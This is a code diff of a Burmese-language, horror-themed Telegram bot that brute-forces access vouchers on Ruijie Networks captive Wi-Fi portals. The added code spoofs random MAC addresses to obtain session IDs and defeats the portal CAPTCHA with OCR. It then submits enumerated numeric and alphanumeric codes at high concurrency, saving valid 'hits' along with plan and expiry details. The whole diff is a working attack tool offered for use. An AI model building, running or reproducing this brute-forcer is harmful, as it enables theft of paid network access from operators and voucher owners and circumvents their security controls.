-        await query.edit_message_text(
-            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
-            f"🔁 Proxies: `{active}`\n{portal_line}",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
+def scan_modes_keyboard():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🩸 6 လုံး Auto", callback_data="run_scan_6"),
+        InlineKeyboardButton("🩸 8 လုံး Auto", callback_data="run_scan_8"),
+        InlineKeyboardButton("🩸 10 လုံး Random", callback_data="run_scan_10"),
+        InlineKeyboardButton("🩸 12 လုံး Random", callback_data="run_scan_12"),
+        InlineKeyboardButton("👁️ 9 လုံး Custom", callback_data="run_scan_num_9"),
+        InlineKeyboardButton("👁️ 14 လုံး Custom", callback_data="run_scan_num_14"),
+        InlineKeyboardButton("🔤 a-z စာလုံးသေး", callback_data="run_scan_lower"),
+        InlineKeyboardButton("🔤 A-Z စာလုံးကြီး", callback_data="run_scan_upper"),
+        InlineKeyboardButton("🔠 စာလုံး ရောစပ်", callback_data="run_scan_mixcase"),
+        InlineKeyboardButton("🔥 စာလုံး + နံပါတ်", callback_data="run_scan_all"),
+        InlineKeyboardButton("🔙 Main Menu", callback_data="btn_back_main")
+    )
+    return markup
 
+def ai_guidance_keyboard():
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton("🩸 ၁။ Link ချိတ်ဆက်နည်း", callback_data="guide_info_1"),
+        InlineKeyboardButton("👁️ ၂။ Scan Mode အသုံးပြုနည်း", callback_data="guide_info_2"),
+        InlineKeyboardButton("🗡️ ၃။ Hits နှင့် Expiry", callback_data="guide_info_3"),
+        InlineKeyboardButton("⚡ ၄။ Speed နှင့် Error ဖြေရှင်းနည်း", callback_data="guide_info_4"),
+        InlineKeyboardButton("🔙 Main Menu", callback_data="btn_back_main")
+    )
+    return markup
 
-async def handle_text(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
-    user_id = update.effective_user.id
-    raw_text = (update.message.text or "").strip()
-    pm = get_proxy_manager()
-    mode = context.user_data.get("selected_mode", "num6")
+def get_spooky_glitch_char():
+    symbols = ['☠️', '🩸', '👁️', '💀', '🕯️', '⚰️', '🧟', '👹']
+    return random.choice(symbols)
 
-    # ---- waiting for portal URL --------------------------------------------
-    if context.user_data.get("waiting_for_portal_url"):
-        context.user_data["waiting_for_portal_url"] = False
-        if not raw_text.lower().startswith(("http://", "https://")):
-            await update.message.reply_text(
-                "❌ မှားနေတဲ့ URL ဖြစ်နိုင်ပါတယ် http/https URL ပြောင်းဖို့ လိုအပ်ပါ")
-            return
+def generate_horror_bar(pct, length=12):
+    filled = int(length * (pct / 100))
+    bar = "🩸" * filled + "🕯️" * (length - filled)
+    return f"⚰️ [{bar}] {pct:.1f}% ⚰️"
+
+def format_progress(checked, total=None, speed=0, found=0, retries=0):
+    speed_str = f"{speed:,.0f} souls/min"
+    spooky = get_spooky_glitch_char()
+    
+    if total is not None:
+        pct = (checked / total) * 100 if total > 0 else 0
+        bar = generate_horror_bar(pct)
+        return (
+            f"🩸 <b>[ LORD OF DARKNESS AI RITUAL ]</b> 🩸\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👁️ <b>RITUAL STATUS</b> : <code>SUMMONING...</code> {spooky}\n"
+            f"☠️ <b>SACRIFICES HITS</b>: <code>{found} SOULS</code>\n"
+            f"⚡ <b>EXECUTION SPEED</b>: <code>{speed_str}</code>\n"
+            f"🩸 <b>CURSED RETRIES</b>  : <code>{retries}</code>\n"
+            f"📦 <b>SOULS DEVOURING</b>: <code>{checked:,}</code> / <code>{total:,}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{bar}\n"
+            f"<i>\"The LORD OF DARKNESS AI consumes all.\"</i>"
+        )
+    
+    return (
+        f"🩸 <b>[ LORD OF DARKNESS AI RITUAL ]</b> 🩸\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👁️ <b>RITUAL STATUS</b> : <code>DEVOURING...</code> {spooky}\n"
+        f"☠️ <b>SACRIFICES HITS</b>: <code>{found} SOULS</code>\n"
+        f"⚡ <b>EXECUTION SPEED</b>: <code>{speed_str}</code>\n"
+        f"🩸 <b>CURSED RETRIES</b>  : <code>{retries}</code>\n"
+        f"📦 <b>SOULS DEVOURING</b>: <code>{checked:,}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🕯️ <i>LORD OF DARKNESS AI searching the void...</i>"
+    )
+
+def format_completion(checked, found, elapsed_time):
+    m, s = divmod(int(elapsed_time), 60)
+    time_str = f"{m}m {s}s" if m > 0 else f"{s}s"
+    
+    return (
+        f"⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️\n"
+        f"☠️ <b>LORD OF DARKNESS RITUAL COMPLETED</b> ☠️\n"
+        f"⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️\n\n"
+        f"🗡️ <b>[ DARKNESS REAP ]</b>\n"
+        f"• <b>Total Devoured</b> : <code>{checked:,} Souls</code>\n"
+        f"• <b>Captured Hits</b>  : <code>{found} Victories</code> 🩸\n"
+        f"• <b>Ritual Time</b>    : <code>{time_str}</code>\n\n"
+        f"👻 <i>The LORD OF DARKNESS AI awaits next order...</i>"
+    )
+
+def get_mac():
+    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
+    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
+    return ':'.join(f'{x:02x}' for x in mac)
+
+def replace_mac(url, new_mac):
+    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
+
+async def check_session_url(session_url):
+    try:
+        from urllib.parse import urlparse, parse_qs
+        parsed = urlparse(session_url)
+        params = parse_qs(parsed.query)
+        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
+        return all(k in params for k in required)
+    except:
+        return False
+
+async def get_session_id(sess, session_url, previous_session_id=None):
+    mac = get_mac()
+    url = replace_mac(session_url, new_mac=mac)
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+    }
+    try:
+        async with sess.get(url, headers=headers, allow_redirects=True) as req:
+            response = str(req.url)
+            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
+            return sid.group(1) if sid else previous_session_id
+    except:
+        return previous_session_id
+
+def _ocr_worker(img_bytes):
+    try:
+        arr = np.frombuffer(img_bytes, np.uint8)
+        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
+        if img is None:
+            return None
+        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        _, buf = cv2.imencode(".png", gray)
+        return get_ocr().classification(buf.tobytes()).upper()
+    except:
+        return None
+
+async def parse_captcha_text(img_bytes):
+    return await asyncio.to_thread(_ocr_worker, img_bytes)
+
+async def fetch_captcha_img(sess, session_id):
+    headers = {
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+    }
+    params = {'sessionId': session_id, '_t': str(time.time())}
+    try:
+        async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
+            return await req.read()
+    except:
+        return None
+
+async def verify_captcha(sess, session_id, text):
+    headers = {
+        'content-type': 'application/json',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+    }
+    json_data = {'sessionId': session_id, 'authCode': text}
+    try:
+        async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
+            data = await req.json()
+            return session_id if data.get("success") else None
+    except:
+        return None
+
+def iter_codes(mode):
+    if mode in ["6", "7"]:
+        length = int(mode)
+        codes = [str(i).zfill(length) for i in range(10 ** length)]
+        random.shuffle(codes)
+        yield from codes
+        return
+    if mode in ["8", "10", "12"]:
+        length = int(mode)
+        while True:
+            yield "".join(random.choice(string.digits) for _ in range(length))
+            
+    if mode.startswith("num_"):
+        length = int(mode.split("_")[1])
+        while True:
+            yield "".join(random.choice(string.digits) for _ in range(length))
+            
+    if mode == "lower":
+        while True:
+            yield "".join(random.choice(string.ascii_lowercase) for _ in range(8))
+    if mode == "upper":
+        while True:
+            yield "".join(random.choice(string.ascii_uppercase) for _ in range(8))
+    if mode == "mixcase":
+        while True:
+            yield "".join(random.choice(string.ascii_letters) for _ in range(8))
+            
+    if mode == "all":
+        chars = string.ascii_letters + string.digits
+        while True:
+            yield "".join(random.choice(chars) for _ in range(8))
+
+    raise ValueError(f"Invalid mode: {mode}")
+
+def format_minutes(total_minutes):
+    if total_minutes is None or total_minutes == "":
+        return 'Unknown'
+    try:
+        mins = int(float(total_minutes))
+        if mins < 0:
+            return 'Expired'
+        h, m = divmod(mins, 60)
+        if h > 0 and m > 0:
+            return f"{h}h {m}m"
+        return f"{h}h" if h > 0 else f"{m}m"
+    except:
+        return str(total_minutes)
+
+def _find_first_value(value, names):
+    if isinstance(value, dict):
+        for key, item in value.items():
+            if str(key).lower() in names and item is not None and item != "":
+                return item
+        for item in value.values():
+            found = _find_first_value(item, names)
+            if found is not None:
+                return found
+    elif isinstance(value, list):
+        for item in value:
+            found = _find_first_value(item, names)
+            if found is not None:
+                return found
+    return None
+
+def format_expiry_value(value):
+    if value is None or value == "":
+        return None
+    if isinstance(value, (int, float)) or (isinstance(value, str) and value.strip().isdigit()):
         try:
-            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
-                f.write(raw_text)
-        except OSError:
+            number = float(value)
+            if number > 100000000000:
+                number /= 1000
+            if number > 1000000000:
+                dt = datetime.fromtimestamp(number, tz=timezone.utc).astimezone()
+                return dt.strftime("%Y-%m-%d %H:%M:%S %Z")
+        except (ValueError, OSError, OverflowError):
             pass
-        total, bad = pm.stats()
-        await update.message.reply_text(
-            "✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ\n\n"
-            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
-            f"🔁 Proxies: `{total - bad}`",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
+    raw = str(value).strip()
+    try:
+        parsed = datetime.fromisoformat(raw.replace("Z", "+00:00"))
+        if parsed.tzinfo is None:
+            parsed = parsed.replace(tzinfo=timezone.utc)
+        return parsed.astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
+    except ValueError:
+        return raw
+
+async def get_expiry_info(session_id):
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'content-type': 'application/json',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+    }
+    try:
+        async with aiohttp.ClientSession(
+            connector=_connector,
+            connector_owner=False,
+            timeout=aiohttp.ClientTimeout(total=5)
+        ) as fresh_session:
+            async with fresh_session.get(
+                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
+                headers=headers
+            ) as req:
+                res = await req.json()
+                result = res.get('result') or res.get('data') or res
+                profile = _find_first_value(result, {'profilename', 'packagename', 'authprofile', 'plan', 'planname', 'profile'}) or 'Standard'
+                total_mins = _find_first_value(result, {'totalminutes', 'remainingminutes', 'remainminutes', 'remaintime', 'totaltime', 'limittime', 'time', 'duration', 'remainingtime'})
+                expire_date = _find_first_value(result, {'expiretime', 'expiredate', 'expiredtime', 'validityperiod', 'validuntil', 'expiresat', 'expire'})
+                duration = format_minutes(total_mins)
+                info_parts = [f"☠️ Plan: {profile}"]
+                if total_mins is not None and duration != 'Unknown':
+                    info_parts.append(f"⏳ Time: {duration}")
+                else:
+                    info_parts.append("⏳ Time: Unavailable")
+                if expire_date:
+                    info_parts.append(f"📅 Expire: {format_expiry_value(expire_date)}")
+                return " | ".join(info_parts)
+    except:
+        return "☠️ Plan: Active | ⏳ Time: Unavailable"
+
+VOUCHER_URL = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+
+async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False):
+    if not recheck:
+        current_task = scan_tasks.get(chat_id)
+        if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+            return None
+
+    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
+    try:
+        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
+            session_id = await get_session_id(task_session, session_url)
+            if not session_id:
+                return None
+
+            auth_code = None
+            for _ in range(2):
+                img = await fetch_captcha_img(task_session, session_id)
+                if not img: continue
+                text = await parse_captcha_text(img)
+                if text and await verify_captcha(task_session, session_id, text):
+                    auth_code = text
+                    break
+            
+            if not auth_code:
+                return None
+
+            data = {
+                "accessCode": code,
+                "sessionId": session_id,
+                "apiVersion": 1,
+                "authCode": auth_code,
+            }
+            headers = {
+                "content-type": "application/json",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
+            }
+            
+            async with task_session.post(VOUCHER_URL, json=data, headers=headers) as req:
+                response = await req.text()
+                
+                if 'logonUrl' in response:
+                    if recheck:
+                        return code
+
+                    if chat_id not in success_texts:
+                        success_texts[chat_id] = []
+                        
+                    expire_info = await get_expiry_info(session_id)
+                    success_texts[chat_id].append(f"🩸 <code>{code}</code>\n └ 🕯️ <i>{expire_info}</i>")
+                    
+                    code_line = "\n".join(success_texts[chat_id])
+                    horror_ui = (
+                        f"👁️ <b>[ LORD OF DARKNESS CAPTURED! ]</b> 🩸\n"
+                        f"☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
+                        f"{code_line}\n"
+                        f"☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
+                        f"👻 <i>Claimed by LORD OF DARKNESS AI...</i>"
+                    )
+                    
+                    try:
+                        if chat_id not in success_messages:
+                            sent = await bot.send_message(chat_id, horror_ui, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+                            success_messages[chat_id] = sent.message_id
+                        else:
+                            await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=horror_ui, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+                    except:
+                        pass
+                    save_hits()
+                    return code
+    except:
+        pass
+    return None
+
+async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
+    try:
+        code_iter = iter_codes(mode)
+    except ValueError as e:
+        await bot.send_message(chat_id, str(e), reply_markup=main_control_menu(chat_id))
         return
 
-    # ---- waiting for proxy list --------------------------------------------
-    if context.user_data.get("waiting_for_proxy_text"):
-        context.user_data["waiting_for_proxy_text"] = False
-        lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
-        if not lines:
-            await update.message.reply_text(
-                "❌ Proxy list အလွတ်မရေးပါနဲ့ အနည်းဆုံးတစ်ကြောင်းထည့်ပါ")
-            return
-        try:
-            with open(PROXY_FILE, "a") as f:
-                f.write("\n".join(lines) + "\n")
-            pm.reload()
-        except OSError as e:
-            await update.message.reply_text(f"❌ Proxy ဖော်မက်မှားနေပါတယ် အများဆုံး: {e}")
-            return
-        total, bad = pm.stats()
-        await update.message.reply_text(
-            "✅ **Proxies ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ**\n"
-            f"📊 Total: `{total}`",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
+    total = 10 ** int(mode) if mode in ["6", "7"] else None
+    checked = 0
+    scan_start = time.monotonic()
+    last_ui_update = time.monotonic()
+    
+    global _voucher_sem
+    if _voucher_sem is None:
+        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
+
+    try:
+        while True:
+            current_task = scan_tasks.get(chat_id)
+            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+                return
+
+            batch = []
+            for _ in range(BATCH_SIZE):
+                try:
+                    batch.append(next(code_iter))
+                except StopIteration:
+                    break
+            if not batch:
+                break
+
+            async def _check(c):
+                async with _voucher_sem:
+                    return await perform_check(session_url, c, chat_id, scan_id)
+
+            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
+
+            checked += len(batch)
+            now = time.monotonic()
+            
+            if now - last_ui_update > 2.0:
+                last_ui_update = now
+                elapsed = now - scan_start
+                speed = (checked / elapsed * 60) if elapsed > 0 else 0
+                found = len(success_texts.get(chat_id, []))
+                retries = retry_counts.get(chat_id, 0)
+                text = format_progress(checked, total, speed, found, retries)
+                
+                try:
+                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+                except:
+                    pass
+
+        if progress_msg:
+            final_found = len(success_texts.get(chat_id, []))
+            elapsed = time.monotonic() - scan_start
+            finish_text = format_completion(checked, final_found, elapsed)
+            
+            try:
+                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+            except:
+                await bot.send_message(chat_id, finish_text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+    finally:
+        scan_tasks.pop(chat_id, None)
+
+@bot.message_handler(commands=['start', 'menu'])
+async def start_interactive_menu(message):
+    chat_id = message.chat.id
+    text = (
+        "🩸 <b>[ LORD OF DARKNESS INTERACTIVE CONTROL ]</b> 🩸\n\n"
+        "<i>\"ငါ LORD OF DARKNESS မှ အသင့်ရှိနေသည်။ Command များ ရိုက်ရန် မလိုဘဲ အောက်ပါ ခလုတ်များဖြင့်သာ အဆင့်ဆင့် ခိုင်းစေနိုင်ပါသည်။\"</i>"
+    )
+    await bot.reply_to(message, text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+
+@bot.callback_query_handler(func=lambda call: True)
+async def handle_button_actions(call):
+    chat_id = call.message.chat.id
+    msg_id = call.message.message_id
+    data = call.data
+
+    if data == "btn_back_main":
+        await bot.edit_message_text(
+            "🩸 <b>[ LORD OF DARKNESS MAIN CONTROL ]</b> 🩸\n\n"
+            "<i>\"အောက်ပါ ခလုတ်များဖြင့် လိုအပ်သော လုပ်ဆောင်ချက်ကို ရွေးချယ်ပါ။\"</i>",
+            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
+        )
+        await answer_callback(call)
         return
 
-    # ---- waiting for custom start digit ------------------------------------
-    if context.user_data.get("waiting_for_digit"):
-        context.user_data["waiting_for_digit"] = False
-        if not raw_text.isdigit():
-            await update.message.reply_text(
-                "❌ ဂဏန်းပဲ ထည့်ပါ (0-9)")
-            return
-        context.user_data["start_digit"] = int(raw_text[0])
-        total, bad = pm.stats()
-        await update.message.reply_text(
-            f"✅ Custom Start Digit = `{raw_text[0]}` ပြောင်းဖို့ ပြုလုပ်ပြီးပါပြီ\n\n"
-            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
-            f"🔁 Proxies: `{total - bad}`",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
+    if data == "btn_guide_bind":
+        text = (
+            "🩸 <b>[ SOUL LINK BINDING ]</b>\n\n"
+            "<b>အသုံးပြုပုံ:</b> Captive Portal URL ကို ကူးယူပြီး ဤ Chat ထဲသို့ <b>တိုက်ရိုက် Paste လုပ်၍ ပို့ပေးပါ။</b>"
+        )
+        await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+        await answer_callback(call)
         return
 
-    # ---- default: show panel -------------------------------------------------
-    saved_url = get_user_data(user_id)
-    total, bad = pm.stats()
-    portal_line = "🌐 Portal: ready ✅" if saved_url else \
-        "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ"
-    await update.message.reply_text(
-        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-        f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
-        f"🔁 Proxies: `{total - bad}`\n{portal_line}",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=get_main_menu_markup())
+    if data == "btn_open_scan_menu":
+        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
+            await answer_callback(call, "☠️ ပထမဦးစွာ Link ချိတ်ဆက်ပေးရန် လိုအပ်ပါသည်!", show_alert=True)
+            return
+        
+        await bot.edit_message_text(
+            "👁️ <b>[ SELECT RITUAL MODE ]</b>\n\n"
+            "<i>\"အောက်ပါ ခလုတ်များမှ စစ်ဆေးလိုသော Digit သို့မဟုတ် Pattern ကို ရွေးချယ်ပါ။\"</i>",
+            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=scan_modes_keyboard()
+        )
+        await answer_callback(call)
+        return
 
+    if data.startswith("run_scan_"):
+        mode = data.replace("run_scan_", "")
+        
+        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
+            await answer_callback(call, "⚡ LORD OF DARKNESS သည် လက်ရှိတွင် Scan ပြုလုပ်နေဆဲ ဖြစ်ပါသည်!", show_alert=True)
+            return
 
-# ==============================================================================
-#  MAIN
-# ==============================================================================
+        progress_msg = await bot.edit_message_text(
+            "🩸 <i>LORD OF DARKNESS initiating ritual...</i>", 
+            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
+        )
+        
+        scan_id = str(uuid.uuid4())
+        task = asyncio.create_task(
+            run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, progress_msg=progress_msg)
+        )
+        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
+        await answer_callback(call)
+        return
 
-def main():
-    app = Application.builder().token(BOT_TOKEN).build()
+    if data == "btn_stop_ritual":
+        task_data = scan_tasks.get(chat_id)
+        if task_data and not task_data["task"].done():
+            task_data["stop"] = True
+            task_data["scan_id"] = None
+            task_data["task"].cancel()
+            
+            await bot.edit_message_text(
+                "🕯️ <b>LORD OF DARKNESS ritual banished!</b>", 
+                chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
+            )
+        await answer_callback(call)
+        return
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("addproxies", add_proxies_cmd))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_handler(CallbackQueryHandler(handle_callbacks))
+    if data == "btn_view_saved":
+        success = success_texts.get(chat_id, [])
+        if not success:
+            await answer_callback(call, "⚰️ Graveyard ထဲတွင် Hits မရှိသေးပါ!", show_alert=True)
+            return
 
-    pm = get_proxy_manager()
-    total, bad = pm.stats()
-    active = total - bad
-    print(f"[MAIN] Proxy Manager initialized: {total}/{active} active proxies")
+        parts = [f"🩸 <b>LORD OF DARKNESS HITS</b> ({len(success)})"]
+        parts.extend(success[:20])
 
-    print("Bot is running with python-telegram-bot...")
-    app.run_polling(drop_pending_updates=True)
-    print("Thank for using By Telegram@sayarkn")
+        await bot.edit_message_text("\n\n".join(parts), chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+        await answer_callback(call)
+        return
 
+    if data == "btn_recheck_saved":
+        success = success_texts.get(chat_id, [])
+        if not success:
+            await answer_callback(call, "👻 ပြန်လည် စစ်ဆေးရန် Hits မရှိသေးပါ!", show_alert=True)
+            return
 
-# ==============================================================================
-#  ENTRY POINT
-# ==============================================================================
+        await bot.edit_message_text("🗡️ <i>LORD OF DARKNESS resurrecting souls...</i>", chat_id=chat_id, message_id=msg_id, parse_mode="HTML")
+        new_success = []
+        for item in success:
+            code = item.split("<code>")[1].split("</code>")[0] if "<code>" in item else item
+            recode = await perform_check(user_data[chat_id]['session_url'], code, chat_id, recheck=True)
+            if recode:
+                new_success.append(item)
 
-show_banner()
-check_time_integrity()
-_proxy_manager = get_proxy_manager()
+        success_texts[chat_id] = new_success
+        save_hits()
+        await bot.edit_message_text(f"🩸 <b>{len(new_success)} souls still belong to LORD OF DARKNESS!</b>", chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+        await answer_callback(call)
+        return
 
-if __name__ == "__main__":
-    main()
+    if data == "btn_realm_status":
+        active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
+        up_secs = int(time.monotonic() - _start_time)
+        h, r = divmod(up_secs, 3600)
+        m, s = divmod(r, 60)
+        total_found = sum(len(v) for v in success_texts.values())
+
+        status_text = (
+            f"🩸 <b>LORD OF DARKNESS REALM METRICS</b> 🩸\n\n"
+            f"⏱ <b>Uptime</b>: <code>{h}h {m}m {s}s</code>\n"
+            f"👁️ <b>Active Rituals</b>: <code>{active_scans}</code>\n"
+            f"🧟 <b>Bound Souls</b>: <code>{len(user_data)}</code>\n"
+            f"⚰️ <b>Total Captured</b>: <code>{total_found}</code>\n"
+        )
+        await bot.edit_message_text(status_text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+        await answer_callback(call)
+        return
+
+    if data == "btn_ai_guide":
+        await bot.edit_message_text(
+            "🤖 <b>[ AI GUIDANCE MENU ]</b>\n\n"
+            "<i>\"သိရှိလိုသော အကြောင်းအရာ ခလုတ်ကို နှိပ်ပါ:\"</i>",
+            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=ai_guidance_keyboard()
+        )
+        await answer_callback(call)
+        return
+
+@bot.message_handler(func=lambda msg: msg.text and not msg.text.startswith("/"))
+async def auto_link_handler(message):
+    chat_id = message.chat.id
+    text = message.text.strip()
+    
+    if text.startswith("http://") or text.startswith("https://"):
+        if await check_session_url(text):
+            user_data.setdefault(chat_id, {})
+            user_data[chat_id]['session_url'] = text
+            success_texts.pop(chat_id, None)
+            save_state()
+            
+            resp = "🩸 <b>[ SOUL LINK BOUND SUCCESSFUL ]</b>\n\n<i>Scan ခလုတ်ကို နှိပ်၍ စတင်နိုင်ပါပြီ။</i>"
+            await bot.reply_to(message, resp, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+        else:
+            await bot.reply_to(message, "☠️ <b>[ INVALID LINK ] Link တွင် gw_id, mac, ip ပါဝင်ရပါမည်။</b>", parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+
+async def main():
+    global session, _connector
+    _connector = aiohttp.TCPConnector(limit=0, force_close=False, ssl=False)
+    session = aiohttp.ClientSession(connector=_connector)
+
+    asyncio.create_task(web_server())
+    load_state()
+    load_hits()
+
+    print("High-Speed Bot is Running...")
+    await bot.infinity_polling(timeout=20, request_timeout=35)
+
+if __name__ == '__main__':
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        pass
